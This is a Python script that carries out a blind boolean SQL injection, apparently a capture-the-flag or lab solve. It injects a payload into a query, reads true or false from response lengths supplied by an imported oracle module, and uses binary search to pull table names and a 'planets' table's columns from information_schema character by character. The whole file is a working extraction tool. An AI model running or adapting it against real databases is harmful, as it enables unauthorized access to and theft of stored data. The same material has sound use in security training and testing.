import oracle as o, sys
def T(e): return "MARS' AND (" + e + ")-- -"
def ck(e):
    a,b = o.clen(T(e)), o.clen(T("NOT (" + e + ")"))
    if (a,b)==(o.TRUE_LEN,o.FALSE_LEN): return True
    if (a,b)==(o.FALSE_LEN,o.TRUE_LEN): return False
    return None
def raw(e):                      # single-shot, no control (use only inside a verified shape)
    return o.clen(T(e)) == o.TRUE_LEN

def find_len(expr, cap=400):
    lo, hi = 0, cap
    if not raw(f"length({expr})<={cap}"): return None
    while lo < hi:
        mid = (lo+hi)//2
        if raw(f"length({expr})<={mid}"): hi = mid
        else: lo = mid+1
    return lo

def extract(expr, n=None, label=''):
    n = n or find_len(expr)
    if n is None: return None
    out = ''
    for i in range(1, n+1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo+hi)//2
            if raw(f"ascii(substring({expr},{i},1))<={mid}"): hi = mid
            else: lo = mid+1
        out += chr(lo)
        print(f'\r  {label}[{n}] {out}', end='', flush=True)
    print()
    return out


def main2():
    tabs = "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')"
    cols = "(SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='planets')"
    print('=== public tables ===');  t = extract(tabs, label='tables  ')
    print('=== planets columns ==='); c = extract(cols, label='columns ')
    print('\nTABLES :', t)
    print('COLUMNS:', c)
    print('requests:', o.STATS['n'])

if __name__ == '__main__':
    print('=== which string aggregate exists? ===')
    for fn in ['string_agg', 'group_concat']:
        e = (f"length({fn}(column_name,',')) > 0" if fn=='string_agg'
             else f"length({fn}(column_name)) > 0")
        q = f"(SELECT {e} FROM information_schema.columns WHERE table_name='planets')"
        print(f'  {fn:<14} -> {ck(q)}', flush=True)
    main2()
